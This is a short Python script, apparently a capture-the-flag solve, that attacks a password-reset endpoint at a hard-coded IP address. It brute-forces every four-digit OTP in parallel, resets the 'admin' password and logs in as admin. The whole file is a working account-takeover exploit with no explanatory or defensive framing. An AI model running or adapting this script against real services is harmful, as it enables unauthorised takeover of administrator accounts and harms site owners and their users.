#!/usr/bin/env python3

import itertools
from concurrent.futures import ProcessPoolExecutor, as_completed
from uuid import uuid4

import requests
from tqdm import tqdm

url = "http://103.185.44.122:7313"

password = str(uuid4())
otps = itertools.product(range(10), repeat=4)


def reset_password(otp):
    otp = ''.join(map(str, otp))
    data = {
        "username": "admin",
        "newpassword": password,
        "otp": otp,
    }
    r = requests.post(f"{url}/reset", data=data)
    return (r.text, otp)


found_otp = None
with ProcessPoolExecutor(max_workers=20) as exc:
    fu = [exc.submit(reset_password, otp) for otp in otps]
    for f in tqdm(as_completed(fu)):
        res, otp = f.result()
        if "Invalid OTP" not in res and otp != -1:
            found_otp = otp
            exc.shutdown(wait=False, cancel_futures=True)
            break

print(f"[+] Found OTP: {found_otp}")

data = {
    "username": "admin",
    "password": password,
}
r = requests.post(url, data=data)
print(r.text)
